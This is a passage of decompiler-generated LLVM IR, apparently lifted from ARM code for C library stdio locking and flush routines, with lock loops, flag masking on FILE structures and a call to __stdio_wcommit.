  %v4_d0dc = load i32, i32* %v3_d0dc, align 4
  store i32 %v4_d0dc, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_d0e4 = add i32 %v0_d0dc, 12
  %v3_d0e4 = inttoptr i32 %v2_d0e4 to i32*
  %v4_d0e4 = load i32, i32* %v3_d0e4, align 4
  store i32 %v4_d0e4, i32* %r2.global-to-local, align 4
  %v1_d0e8 = add i32 %v4_d0dc, 4
  %v2_d0e8 = inttoptr i32 %v1_d0e8 to i32*
  %v3_d0e8 = load i32, i32* %v2_d0e8, align 4
  store i32 %v3_d0e8, i32* %r1.global-to-local, align 4
  %v1_d0ec = inttoptr i32 %v4_d0e4 to i32*
  %v2_d0ec = load i32, i32* %v1_d0ec, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d0f0 = icmp eq i32 %v3_d0e8, 0
  %v1_d0f4 = add i32 %v2_d0ec, 1
  store i32 %v1_d0f4, i32* %r3.global-to-local, align 4
  store i32 %v1_d0f4, i32* %v1_d0ec, align 4
  br i1 %v2_d0f0, label %dec_label_pc_d100, label %dec_label_pc_d160

dec_label_pc_d100:                                ; preds = %dec_label_pc_d0d8
  %v0_d100 = load i32, i32* %r1.global-to-local, align 4
  %v1_d100 = load i32, i32* %r0.global-to-local, align 4
  %v2_d100 = add i32 %v1_d100, 8
  %v3_d100 = inttoptr i32 %v2_d100 to i32*
  store i32 %v0_d100, i32* %v3_d100, align 4
  %v0_d104 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_d104, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_d108

dec_label_pc_d108:                                ; preds = %dec_label_pc_d138.dec_label_pc_d108_crit_edge, %dec_label_pc_d100
  %v0_d108 = phi i32 [ %v0_d108.pre, %dec_label_pc_d138.dec_label_pc_d108_crit_edge ], [ %v0_d104, %dec_label_pc_d100 ]
  %v1_d108 = inttoptr i32 %v0_d108 to i32*
  %v2_d108 = load i32, i32* %v1_d108, align 4
  store i32 %v2_d108, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_d108, i32* %r2.global-to-local, align 4
  %v2_d114131 = load i32, i32* %v1_d108, align 4
  store i32 %v2_d114131, i32* %r3.global-to-local, align 4
  %v3_d118133 = icmp uge i32 %v2_d114131, %v2_d108
  store i1 %v3_d118133, i1* %cpsr_c.global-to-local, align 1
  %v9_d118139 = icmp eq i32 %v2_d114131, %v2_d108
  br i1 %v9_d118139, label %dec_label_pc_d120, label %dec_label_pc_d138

dec_label_pc_d120:                                ; preds = %dec_label_pc_d108, %dec_label_pc_d120.dec_label_pc_d114_crit_edge
  %v0_d120140 = phi i32 [ %v1_d118.pre, %dec_label_pc_d120.dec_label_pc_d114_crit_edge ], [ %v2_d108, %dec_label_pc_d108 ]
  store i32 %v0_d120140, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_d130 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_d130, label %dec_label_pc_d134, label %dec_label_pc_d120.dec_label_pc_d114_crit_edge

dec_label_pc_d120.dec_label_pc_d114_crit_edge:    ; preds = %dec_label_pc_d120
  %v0_d114.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_d118.pre = load i32, i32* @r4, align 4
  %v1_d114 = inttoptr i32 %v0_d114.pre to i32*
  %v2_d114 = load i32, i32* %v1_d114, align 4
  store i32 %v2_d114, i32* %r3.global-to-local, align 4
  %v3_d118 = icmp uge i32 %v2_d114, %v1_d118.pre
  store i1 %v3_d118, i1* %cpsr_c.global-to-local, align 1
  %v9_d118 = icmp eq i32 %v2_d114, %v1_d118.pre
  br i1 %v9_d118, label %dec_label_pc_d120, label %dec_label_pc_d138

dec_label_pc_d134:                                ; preds = %dec_label_pc_d120
  %v0_d134 = load i32, i32* @r4, align 4
  store i32 %v0_d134, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d138

dec_label_pc_d138:                                ; preds = %dec_label_pc_d108, %dec_label_pc_d120.dec_label_pc_d114_crit_edge, %dec_label_pc_d134
  %v0_d140 = phi i32 [ %v0_d134, %dec_label_pc_d134 ], [ %v2_d114131, %dec_label_pc_d108 ], [ %v2_d114, %dec_label_pc_d120.dec_label_pc_d114_crit_edge ]
  %v1_d138 = phi i32 [ %v0_d134, %dec_label_pc_d134 ], [ %v2_d108, %dec_label_pc_d108 ], [ %v1_d118.pre, %dec_label_pc_d120.dec_label_pc_d114_crit_edge ]
  %v3_d138 = icmp uge i32 %v0_d140, %v1_d138
  store i1 %v3_d138, i1* %cpsr_c.global-to-local, align 1
  %v9_d138 = icmp eq i32 %v0_d140, %v1_d138
  br i1 %v9_d138, label %dec_label_pc_d140, label %dec_label_pc_d138.dec_label_pc_d108_crit_edge

dec_label_pc_d138.dec_label_pc_d108_crit_edge:    ; preds = %dec_label_pc_d138
  %v0_d108.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_d108

dec_label_pc_d140:                                ; preds = %dec_label_pc_d138
  %v2_d140 = icmp ne i32 %v1_d138, 0
  store i1 %v2_d140, i1* %cpsr_c.global-to-local, align 1
  %v7_d144 = icmp slt i32 %v1_d138, 2
  br i1 %v7_d144, label %dec_label_pc_d160, label %dec_label_pc_d148

dec_label_pc_d148:                                ; preds = %dec_label_pc_d140
  %v0_d148 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_d148, i32* %r0.global-to-local, align 4
  %v0_d14c = load i32, i32* %r1.global-to-local, align 4
  %v1_d14c = add i32 %v0_d14c, 129
  store i32 %v1_d14c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d160

dec_label_pc_d160:                                ; preds = %dec_label_pc_d0d8, %dec_label_pc_d148, %dec_label_pc_d140
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_d164 = load i32, i32* @r6, align 4
  %v2_d164 = add i32 %v0_d164, 160
  %v3_d164 = inttoptr i32 %v2_d164 to i32*
  %v4_d164 = load i32, i32* %v3_d164, align 4
  store i32 %v4_d164, i32* %r5.global-to-local, align 4
  %v1_d168 = add i32 %v4_d164, 8
  %v2_d168 = inttoptr i32 %v1_d168 to i32*
  %v3_d168 = load i32, i32* %v2_d168, align 4
  store i32 %v3_d168, i32* %r3.global-to-local, align 4
  %v1_d16c = load i32, i32* %r8.global-to-local, align 4
  %v3_d16c = icmp uge i32 %v3_d168, %v1_d16c
  store i1 %v3_d16c, i1* %cpsr_c.global-to-local, align 1
  %v9_d16c = icmp eq i32 %v3_d168, %v1_d16c
  br i1 %v9_d16c, label %dec_label_pc_d1b4, label %dec_label_pc_d174

dec_label_pc_d174:                                ; preds = %dec_label_pc_d160
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_d164, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_d180123 = inttoptr i32 %v4_d164 to i32*
  %v2_d180124 = load i32, i32* %v1_d180123, align 4
  store i32 %v2_d180124, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_d184126 = icmp eq i32 %v2_d180124, 0
  br i1 %v9_d184126, label %dec_label_pc_d18c, label %dec_label_pc_d1a4

dec_label_pc_d18c:                                ; preds = %dec_label_pc_d174, %dec_label_pc_d18c.dec_label_pc_d180_crit_edge
  %v0_d18c127 = phi i32 [ %v1_d184.pre, %dec_label_pc_d18c.dec_label_pc_d180_crit_edge ], [ 0, %dec_label_pc_d174 ]
  store i32 %v0_d18c127, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_d19c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_d19c, label %dec_label_pc_d1a0, label %dec_label_pc_d18c.dec_label_pc_d180_crit_edge

dec_label_pc_d18c.dec_label_pc_d180_crit_edge:    ; preds = %dec_label_pc_d18c
  %v0_d180.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_d184.pre = load i32, i32* @r4, align 4
  %v1_d180 = inttoptr i32 %v0_d180.pre to i32*
  %v2_d180 = load i32, i32* %v1_d180, align 4
  store i32 %v2_d180, i32* %r3.global-to-local, align 4
  %v3_d184 = icmp uge i32 %v2_d180, %v1_d184.pre
  store i1 %v3_d184, i1* %cpsr_c.global-to-local, align 1
  %v9_d184 = icmp eq i32 %v2_d180, %v1_d184.pre
  br i1 %v9_d184, label %dec_label_pc_d18c, label %dec_label_pc_d1a4

dec_label_pc_d1a0:                                ; preds = %dec_label_pc_d18c
  %v0_d1a0 = load i32, i32* @r4, align 4
  store i32 %v0_d1a0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d1a4

dec_label_pc_d1a4:                                ; preds = %dec_label_pc_d174, %dec_label_pc_d18c.dec_label_pc_d180_crit_edge, %dec_label_pc_d1a0
  %v0_d1a4 = phi i32 [ %v0_d1a0, %dec_label_pc_d1a0 ], [ %v2_d180124, %dec_label_pc_d174 ], [ %v2_d180, %dec_label_pc_d18c.dec_label_pc_d180_crit_edge ]
  %v1_d1a4 = phi i32 [ %v0_d1a0, %dec_label_pc_d1a0 ], [ 0, %dec_label_pc_d174 ], [ %v1_d184.pre, %dec_label_pc_d18c.dec_label_pc_d180_crit_edge ]
  %v3_d1a4 = icmp uge i32 %v0_d1a4, %v1_d1a4
  store i1 %v3_d1a4, i1* %cpsr_c.global-to-local, align 1
  %v9_d1a4 = icmp eq i32 %v0_d1a4, %v1_d1a4
  br i1 %v9_d1a4, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_d1a4
  %v1_d1a8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_d1a8, i32* %r0.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_d1a4, %bb67
  %v1_d1ac = xor i1 %v9_d1a4, true
  call void @__pseudo_cond_branch(i1 %v1_d1ac, i32 ptrtoint (i32* @global_var_10884.421 to i32))
  %v0_d1b0 = load i32, i32* %r8.global-to-local, align 4
  %v1_d1b0 = load i32, i32* %r5.global-to-local, align 4
  %v2_d1b0 = add i32 %v1_d1b0, 8
  %v3_d1b0 = inttoptr i32 %v2_d1b0 to i32*
  store i32 %v0_d1b0, i32* %v3_d1b0, align 4
  %v0_d1b8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_d1b4

dec_label_pc_d1b4:                                ; preds = %dec_label_pc_d160, %bb68
  %v0_d1c4 = phi i32 [ %v0_d164, %dec_label_pc_d160 ], [ %v0_d1b8.pre, %bb68 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_d1b8 = add i32 %v0_d1c4, 160
  %v3_d1b8 = inttoptr i32 %v2_d1b8 to i32*
  %v4_d1b8 = load i32, i32* %v3_d1b8, align 4
  store i32 %v4_d1b8, i32* %r0.global-to-local, align 4
  store i32 84, i32* %r3.global-to-local, align 4
  %v1_d1c0 = add i32 %v4_d1b8, 4
  %v2_d1c0 = inttoptr i32 %v1_d1c0 to i32*
  %v3_d1c0 = load i32, i32* %v2_d1c0, align 4
  store i32 %v3_d1c0, i32* %r1.global-to-local, align 4
  %v2_d1c4 = add i32 %v0_d1c4, 84
  %v3_d1c4 = inttoptr i32 %v2_d1c4 to i32*
  %v4_d1c4 = load i32, i32* %v3_d1c4, align 4
  store i32 %v4_d1c4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d1c8 = icmp eq i32 %v3_d1c0, 0
  %v1_d1cc = inttoptr i32 %v4_d1c4 to i32*
  %v2_d1cc = load i32, i32* %v1_d1cc, align 4
  store i32 %v2_d1cc, i32* @r5, align 4
  br i1 %v2_d1c8, label %dec_label_pc_d1d4, label %dec_label_pc_d234

dec_label_pc_d1d4:                                ; preds = %dec_label_pc_d1b4
  %v2_d1d4 = add i32 %v4_d1b8, 8
  %v3_d1d4 = inttoptr i32 %v2_d1d4 to i32*
  store i32 0, i32* %v3_d1d4, align 4
  %v0_d1d8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_d1d8, i32* @r7, align 4
  br label %dec_label_pc_d1dc

dec_label_pc_d1dc:                                ; preds = %dec_label_pc_d20c.dec_label_pc_d1dc_crit_edge, %dec_label_pc_d1d4
  %v0_d1dc = phi i32 [ %v0_d1dc.pre, %dec_label_pc_d20c.dec_label_pc_d1dc_crit_edge ], [ %v0_d1d8, %dec_label_pc_d1d4 ]
  %v1_d1dc = inttoptr i32 %v0_d1dc to i32*
  %v2_d1dc = load i32, i32* %v1_d1dc, align 4
  store i32 %v2_d1dc, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_d1dc, i32* %r2.global-to-local, align 4
  %v2_d1e8111 = load i32, i32* %v1_d1dc, align 4
  store i32 %v2_d1e8111, i32* %r3.global-to-local, align 4
  %v3_d1ec113 = icmp uge i32 %v2_d1e8111, %v2_d1dc
  store i1 %v3_d1ec113, i1* %cpsr_c.global-to-local, align 1
  %v9_d1ec119 = icmp eq i32 %v2_d1e8111, %v2_d1dc
  br i1 %v9_d1ec119, label %dec_label_pc_d1f4, label %dec_label_pc_d20c

dec_label_pc_d1f4:                                ; preds = %dec_label_pc_d1dc, %dec_label_pc_d1f4.dec_label_pc_d1e8_crit_edge
  %v0_d1f4120 = phi i32 [ %v1_d1ec.pre, %dec_label_pc_d1f4.dec_label_pc_d1e8_crit_edge ], [ %v2_d1dc, %dec_label_pc_d1dc ]
  store i32 %v0_d1f4120, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_d204 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_d204, label %dec_label_pc_d208, label %dec_label_pc_d1f4.dec_label_pc_d1e8_crit_edge

dec_label_pc_d1f4.dec_label_pc_d1e8_crit_edge:    ; preds = %dec_label_pc_d1f4
  %v0_d1e8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_d1ec.pre = load i32, i32* @r4, align 4
  %v1_d1e8 = inttoptr i32 %v0_d1e8.pre to i32*
  %v2_d1e8 = load i32, i32* %v1_d1e8, align 4
  store i32 %v2_d1e8, i32* %r3.global-to-local, align 4
  %v3_d1ec = icmp uge i32 %v2_d1e8, %v1_d1ec.pre
  store i1 %v3_d1ec, i1* %cpsr_c.global-to-local, align 1
  %v9_d1ec = icmp eq i32 %v2_d1e8, %v1_d1ec.pre
  br i1 %v9_d1ec, label %dec_label_pc_d1f4, label %dec_label_pc_d20c

dec_label_pc_d208:                                ; preds = %dec_label_pc_d1f4
  %v0_d208 = load i32, i32* @r4, align 4
  store i32 %v0_d208, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d20c

dec_label_pc_d20c:                                ; preds = %dec_label_pc_d1dc, %dec_label_pc_d1f4.dec_label_pc_d1e8_crit_edge, %dec_label_pc_d208
  %v0_d214 = phi i32 [ %v0_d208, %dec_label_pc_d208 ], [ %v2_d1e8111, %dec_label_pc_d1dc ], [ %v2_d1e8, %dec_label_pc_d1f4.dec_label_pc_d1e8_crit_edge ]
  %v1_d20c = phi i32 [ %v0_d208, %dec_label_pc_d208 ], [ %v2_d1dc, %dec_label_pc_d1dc ], [ %v1_d1ec.pre, %dec_label_pc_d1f4.dec_label_pc_d1e8_crit_edge ]
  %v3_d20c = icmp uge i32 %v0_d214, %v1_d20c
  store i1 %v3_d20c, i1* %cpsr_c.global-to-local, align 1
  %v9_d20c = icmp eq i32 %v0_d214, %v1_d20c
  br i1 %v9_d20c, label %dec_label_pc_d214, label %dec_label_pc_d20c.dec_label_pc_d1dc_crit_edge

dec_label_pc_d20c.dec_label_pc_d1dc_crit_edge:    ; preds = %dec_label_pc_d20c
  %v0_d1dc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d1dc

dec_label_pc_d214:                                ; preds = %dec_label_pc_d20c
  %v2_d214 = icmp ne i32 %v1_d20c, 0
  store i1 %v2_d214, i1* %cpsr_c.global-to-local, align 1
  %v7_d218 = icmp slt i32 %v1_d20c, 2
  br i1 %v7_d218, label %dec_label_pc_d234thread-pre-split, label %dec_label_pc_d21c

dec_label_pc_d21c:                                ; preds = %dec_label_pc_d214
  %v0_d21c = load i32, i32* @r7, align 4
  store i32 %v0_d21c, i32* %r0.global-to-local, align 4
  %v0_d220 = load i32, i32* %r1.global-to-local, align 4
  %v1_d220 = add i32 %v0_d220, 129
  store i32 %v1_d220, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d234thread-pre-split

dec_label_pc_d234thread-pre-split:                ; preds = %dec_label_pc_d214, %dec_label_pc_d21c
  %v0_d380.pr.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_d234

dec_label_pc_d234:                                ; preds = %dec_label_pc_d234thread-pre-split, %dec_label_pc_d1b4
  %v0_d380.pr = phi i32 [ %v0_d380.pr.pr, %dec_label_pc_d234thread-pre-split ], [ %v2_d1cc, %dec_label_pc_d1b4 ]
  store i32 100, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d38018 = icmp eq i32 %v0_d380.pr, 0
  br i1 %v2_d38018, label %dec_label_pc_d388, label %dec_label_pc_d244

dec_label_pc_d244:                                ; preds = %dec_label_pc_d234, %dec_label_pc_d37c
  %v0_d26c = phi i32 [ %v3_d37c, %dec_label_pc_d37c ], [ %v0_d380.pr, %dec_label_pc_d234 ]
  %v1_d244 = inttoptr i32 %v0_d26c to i16*
  %v2_d244 = load i16, i16* %v1_d244, align 2
  %v3_d244 = zext i16 %v2_d244 to i32
  store i32 %v3_d244, i32* %r3.global-to-local, align 4
  %v1_d248 = and i32 %v3_d244, 64
  %v2_d248 = icmp eq i32 %v1_d248, 0
  br i1 %v2_d248, label %dec_label_pc_d37c, label %dec_label_pc_d250

dec_label_pc_d250:                                ; preds = %dec_label_pc_d244
  %v0_d250 = load i32, i32* @r6, align 4
  %v1_d250 = load i32, i32* %sb.global-to-local, align 4
  %v2_d250 = add i32 %v1_d250, %v0_d250
  %v3_d250 = inttoptr i32 %v2_d250 to i32*
  %v4_d250 = load i32, i32* %v3_d250, align 4
  store i32 %v4_d250, i32* %r3.global-to-local, align 4
  %v1_d254 = inttoptr i32 %v4_d250 to i32*
  %v2_d254 = load i32, i32* %v1_d254, align 4
  store i32 %v2_d254, i32* %r3.global-to-local, align 4
  %v2_d258 = icmp ugt i32 %v2_d254, 1
  store i1 %v2_d258, i1* %cpsr_c.global-to-local, align 1
  %v7_d258 = icmp eq i32 %v2_d254, 2
  br i1 %v7_d258, label %dec_label_pc_d2bc, label %dec_label_pc_d260

dec_label_pc_d260:                                ; preds = %dec_label_pc_d250
  %v1_d260 = add i32 %v0_d26c, 64
  %v2_d260 = inttoptr i32 %v1_d260 to i32*
  %v3_d260 = load i32, i32* %v2_d260, align 4
  store i32 %v3_d260, i32* %r3.global-to-local, align 4
  %v1_d264 = load i32, i32* %r8.global-to-local, align 4
  %v3_d264 = icmp uge i32 %v3_d260, %v1_d264
  store i1 %v3_d264, i1* %cpsr_c.global-to-local, align 1
  %v9_d264 = icmp eq i32 %v3_d260, %v1_d264
  br i1 %v9_d264, label %dec_label_pc_d2b0, label %dec_label_pc_d26c

dec_label_pc_d26c:                                ; preds = %dec_label_pc_d260
  %v1_d26c = add i32 %v0_d26c, 56
  store i32 %v1_d26c, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_d26c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_d27c86 = inttoptr i32 %v1_d26c to i32*
  %v2_d27c87 = load i32, i32* %v1_d27c86, align 4
  store i32 %v2_d27c87, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_d28094 = icmp eq i32 %v2_d27c87, 0
  br i1 %v9_d28094, label %dec_label_pc_d288, label %dec_label_pc_d2a0

dec_label_pc_d288:                                ; preds = %dec_label_pc_d26c, %dec_label_pc_d288.dec_label_pc_d27c_crit_edge
  %v0_d28895 = phi i32 [ %v1_d280.pre, %dec_label_pc_d288.dec_label_pc_d27c_crit_edge ], [ 0, %dec_label_pc_d26c ]
  store i32 %v0_d28895, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_d298 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_d298, label %dec_label_pc_d29c, label %dec_label_pc_d288.dec_label_pc_d27c_crit_edge

dec_label_pc_d288.dec_label_pc_d27c_crit_edge:    ; preds = %dec_label_pc_d288
  %v0_d27c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_d280.pre = load i32, i32* @r4, align 4
  %v1_d27c = inttoptr i32 %v0_d27c.pre to i32*
  %v2_d27c = load i32, i32* %v1_d27c, align 4
  store i32 %v2_d27c, i32* %r3.global-to-local, align 4
  %v3_d280 = icmp uge i32 %v2_d27c, %v1_d280.pre
  store i1 %v3_d280, i1* %cpsr_c.global-to-local, align 1
  %v9_d280 = icmp eq i32 %v2_d27c, %v1_d280.pre
  br i1 %v9_d280, label %dec_label_pc_d288, label %dec_label_pc_d2a0

dec_label_pc_d29c:                                ; preds = %dec_label_pc_d288
  %v0_d29c = load i32, i32* @r4, align 4
  store i32 %v0_d29c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d2a0

dec_label_pc_d2a0:                                ; preds = %dec_label_pc_d26c, %dec_label_pc_d288.dec_label_pc_d27c_crit_edge, %dec_label_pc_d29c
  %v0_d2a0 = phi i32 [ %v0_d29c, %dec_label_pc_d29c ], [ %v2_d27c87, %dec_label_pc_d26c ], [ %v2_d27c, %dec_label_pc_d288.dec_label_pc_d27c_crit_edge ]
  %v1_d2a0 = phi i32 [ %v0_d29c, %dec_label_pc_d29c ], [ 0, %dec_label_pc_d26c ], [ %v1_d280.pre, %dec_label_pc_d288.dec_label_pc_d27c_crit_edge ]
  %v3_d2a0 = icmp uge i32 %v0_d2a0, %v1_d2a0
  store i1 %v3_d2a0, i1* %cpsr_c.global-to-local, align 1
  %v9_d2a0 = icmp eq i32 %v0_d2a0, %v1_d2a0
  br i1 %v9_d2a0, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_d2a0
  %v1_d2a4 = load i32, i32* @r7, align 4
  store i32 %v1_d2a4, i32* %r0.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_d2a0, %bb69
  %v1_d2a8 = xor i1 %v9_d2a0, true
  call void @__pseudo_cond_branch(i1 %v1_d2a8, i32 ptrtoint (i32* @global_var_10884.421 to i32))
  %v0_d2ac = load i32, i32* %r8.global-to-local, align 4
  %v1_d2ac = load i32, i32* @r5, align 4
  %v2_d2ac = add i32 %v1_d2ac, 64
  %v3_d2ac = inttoptr i32 %v2_d2ac to i32*
  store i32 %v0_d2ac, i32* %v3_d2ac, align 4
  %v0_d2b0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d2b0

dec_label_pc_d2b0:                                ; preds = %dec_label_pc_d260, %bb70
  %v0_d2b0 = phi i32 [ %v0_d26c, %dec_label_pc_d260 ], [ %v0_d2b0.pre, %bb70 ]
  %v1_d2b0 = add i32 %v0_d2b0, 60
  %v2_d2b0 = inttoptr i32 %v1_d2b0 to i32*
  %v3_d2b0 = load i32, i32* %v2_d2b0, align 4
  %v1_d2b4 = add i32 %v3_d2b0, 1
  store i32 %v1_d2b4, i32* %r3.global-to-local, align 4
  store i32 %v1_d2b4, i32* %v2_d2b0, align 4
  %v0_d2bc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d2bc

dec_label_pc_d2bc:                                ; preds = %dec_label_pc_d250, %dec_label_pc_d2b0
  %v0_d2d4 = phi i32 [ %v0_d26c, %dec_label_pc_d250 ], [ %v0_d2bc.pre, %dec_label_pc_d2b0 ]
  %v1_d2bc = inttoptr i32 %v0_d2d4 to i16*
  %v2_d2bc = load i16, i16* %v1_d2bc, align 2
  %v3_d2bc = zext i16 %v2_d2bc to i32
  store i32 %stack_var_-44.1, i32* %r2.global-to-local, align 4
  %v2_d2c4 = or i32 %v3_d2bc, %stack_var_-44.1
  %v1_d2c8 = xor i32 %v2_d2c4, 320
  store i32 %v1_d2c8, i32* %r3.global-to-local, align 4
  %v1_d2cc = and i32 %v1_d2c8, 832
  %v2_d2cc = icmp eq i32 %v1_d2cc, 0
  br i1 %v2_d2cc, label %dec_label_pc_d2d4, label %bb71

dec_label_pc_d2d4:                                ; preds = %dec_label_pc_d2bc
  store i32 %v0_d2d4, i32* @r0, align 4
  %v0_d2d8 = call i32 @__stdio_wcommit()
  store i32 %v0_d2d8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d2dc = icmp eq i32 %v0_d2d8, 0
  br i1 %v2_d2dc, label %.thread6, label %.thread7

.thread6:                                         ; preds = %dec_label_pc_d2d4
  %v1_d2e0 = load i32, i32* @r5, align 4
  %v2_d2e0 = inttoptr i32 %v1_d2e0 to i16*
  %v3_d2e0 = load i16, i16* %v2_d2e0, align 2
  %v4_d2e0 = zext i16 %v3_d2e0 to i32
  store i32 %v4_d2e0, i32* %r3.global-to-local, align 4
  %v2_d2e4 = add i32 %v1_d2e0, 8
  %v3_d2e4 = inttoptr i32 %v2_d2e4 to i32*
  %v4_d2e4 = load i32, i32* %v3_d2e4, align 4
  store i32 %v4_d2e4, i32* %r2.global-to-local, align 4
  %v2_d2e8 = and i32 %v4_d2e0, 65471
  store i32 %v2_d2e8, i32* %r3.global-to-local, align 4
  %v3_d2ec = add i32 %v1_d2e0, 28
  %v4_d2ec = inttoptr i32 %v3_d2ec to i32*
  store i32 %v4_d2e4, i32* %v4_d2ec, align 4
  %v1_d2f0 = load i32, i32* %r3.global-to-local, align 4
  %v2_d2f0 = trunc i32 %v1_d2f0 to i16
  %v3_d2f0 = load i32, i32* @r5, align 4
  %v4_d2f0 = inttoptr i32 %v3_d2f0 to i16*
  store i16 %v2_d2f0, i16* %v4_d2f0, align 2
  br label %bb71

.thread7:                                         ; preds = %dec_label_pc_d2d4
  %v1_d2f4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_d2f4, i32* %sl.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %.thread6, %dec_label_pc_d2bc, %.thread7
  %v0_d2f8 = load i32, i32* @r6, align 4
  %v1_d2f8 = load i32, i32* %sb.global-to-local, align 4
  %v2_d2f8 = add i32 %v1_d2f8, %v0_d2f8
  %v3_d2f8 = inttoptr i32 %v2_d2f8 to i32*
  %v4_d2f8 = load i32, i32* %v3_d2f8, align 4
  store i32 %v4_d2f8, i32* %r3.global-to-local, align 4
  %v1_d2fc = inttoptr i32 %v4_d2f8 to i32*
  %v2_d2fc = load i32, i32* %v1_d2fc, align 4
  store i32 %v2_d2fc, i32* %r3.global-to-local, align 4
  %v2_d300 = icmp ugt i32 %v2_d2fc, 1
  store i1 %v2_d300, i1* %cpsr_c.global-to-local, align 1
  %v7_d300 = icmp eq i32 %v2_d2fc, 2
  br i1 %v7_d300, label %dec_label_pc_d37c, label %dec_label_pc_d308

dec_label_pc_d308:                                ; preds = %bb71
  %v0_d308 = load i32, i32* @r5, align 4
  %v1_d308 = add i32 %v0_d308, 60
  %v2_d308 = inttoptr i32 %v1_d308 to i32*
  %v3_d308 = load i32, i32* %v2_d308, align 4
  %v1_d30c = add i32 %v3_d308, -1
  store i32 %v1_d30c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d310 = icmp eq i32 %v1_d30c, 0
  store i32 %v1_d30c, i32* %v2_d308, align 4
  br i1 %v2_d310, label %dec_label_pc_d31c, label %dec_label_pc_d37c

dec_label_pc_d31c:                                ; preds = %dec_label_pc_d308
  %v0_d31c = load i32, i32* %r3.global-to-local, align 4
  %v1_d31c = load i32, i32* @r5, align 4
  %v2_d31c = add i32 %v1_d31c, 64
  %v3_d31c = inttoptr i32 %v2_d31c to i32*
  store i32 %v0_d31c, i32* %v3_d31c, align 4
  %v0_d320 = load i32, i32* @r5, align 4
  %v1_d320 = add i32 %v0_d320, 56
  store i32 %v1_d320, i32* @r7, align 4
  br label %dec_label_pc_d324

dec_label_pc_d324:                                ; preds = %dec_label_pc_d354.dec_label_pc_d324_crit_edge, %dec_label_pc_d31c
  %v0_d32c = phi i32 [ %v0_d32c.pre, %dec_label_pc_d354.dec_label_pc_d324_crit_edge ], [ %v1_d320, %dec_label_pc_d31c ]
  %v0_d324 = phi i32 [ %v0_d324.pre, %dec_label_pc_d354.dec_label_pc_d324_crit_edge ], [ %v0_d320, %dec_label_pc_d31c ]
  %v1_d324 = add i32 %v0_d324, 56
  %v2_d324 = inttoptr i32 %v1_d324 to i32*
  %v3_d324 = load i32, i32* %v2_d324, align 4
  store i32 %v3_d324, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_d32c, i32* %r2.global-to-local, align 4
  %v1_d33097 = inttoptr i32 %v0_d32c to i32*
  %v2_d33098 = load i32, i32* %v1_d33097, align 4
  store i32 %v2_d33098, i32* %r3.global-to-local, align 4
  %v3_d334100 = icmp uge i32 %v2_d33098, %v3_d324
  store i1 %v3_d334100, i1* %cpsr_c.global-to-local, align 1
